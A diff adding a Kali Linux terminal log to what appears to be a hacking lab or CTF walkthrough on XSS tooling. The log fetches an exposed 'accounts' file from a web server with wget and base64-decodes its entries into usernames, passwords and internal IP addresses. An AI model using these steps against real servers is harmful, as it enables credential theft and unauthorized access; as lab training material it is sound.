@@ -77,4 +77,36 @@ On kali linux xss tool like <b>Beef-xss</b> or just add some input field give a 
 
 ```
 
+```
+┌──(kali㉿kali)-[~]
+└─$ wget http://147.90.23.183/supplier/accounts
+--2024-01-27 17:34:50--  http://147.90.23.183/supplier/accounts
+Connecting to 147.90.23.183:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 215 [text/plain]
+Saving to: ‘accounts’
 
+accounts                         100%[========================================================>]     215  --.-KB/s    in 0s 
+
+2024-01-27 17:34:50 (12.8 MB/s) - ‘accounts’ saved [215/215]
+                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ cat accounts     
+1001:am9ldXNlci9wYXNzd29yZC9wbGF0bnVtLzE5Mi4xNjguMTAwLjU2DQo=
+1002:a3JvZW1lci9zM0NyM3QvZ29sZC8xMC4xMDAuMTAwLjE=
+1003:amFuZXVzZXIvd2FpdGluZzRGcmlkYXkvMTcyLjIyLjEyLjE5
+1004:a2Jvb2tvdXQvc2VuZG1lYXBvLzEwLjEwMC4xMDAuMjA=                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ echo am9ldXNlci9wYXNzd29yZC9wbGF0bnVtLzE5Mi4xNjguMTAwLjU2DQo= | base64 --decode
+joeuser/password/platnum/192.168.100.56
+                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ echo a2Jvb2tvdXQvc2VuZG1lYXBvLzEwLjEwMC4xMDAuMjA= | base64 --decode 
+kbookout/sendmeapo/10.100.100.20                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ echo  a3JvZW1lci9zM0NyM3QvZ29sZC8xMC4xMDAuMTAwLjE= | base64 --decode
+kroemer/s3Cr3t/gold/10.100.100.1                                                                                                                            
+┌──(kali㉿kali)-[~]
+└─$ echo amFuZXVzZXIvd2FpdGluZzRGcmlkYXkvMTcyLjIyLjEyLjE5 | base64 --decode
+janeuser/waiting4Friday/172.22.12.19                                                                                        
+```
